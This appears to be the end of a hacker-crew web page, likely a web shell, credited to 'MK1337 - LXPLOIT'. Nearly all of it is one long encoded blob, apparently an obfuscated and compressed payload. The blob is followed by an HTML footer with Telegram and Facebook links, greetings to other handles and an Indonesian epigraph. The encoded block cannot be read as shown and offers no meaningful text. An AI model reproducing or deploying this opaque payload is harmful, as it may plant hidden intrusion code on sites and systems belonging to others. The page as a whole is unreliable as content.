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
  <div class="clearfooter"></div>
</div>

<div class="end" id='footer' style="margin-top: 20px;">
<p align="center"><b>MK1337 - LXPLOIT</b><br />
(: <a href="http://t.me/mk1337_HxR">Telegram</a> | <a href="http://facebook.com/lumajangteamsec">Facebook</a> :) <br />
\m/ <b>Greetz </b> : Cubjrnet7 - Noniod7 - Alif Alexis - Demon Alivos\m/<br />
Sebuah Epilog Tanpa Prolog,
Kisah yang Tak Pernah Dimulai Namun Sudah Berakhir Tanpa Kata Selesai. 
</p>
</div>

</body>
</html>
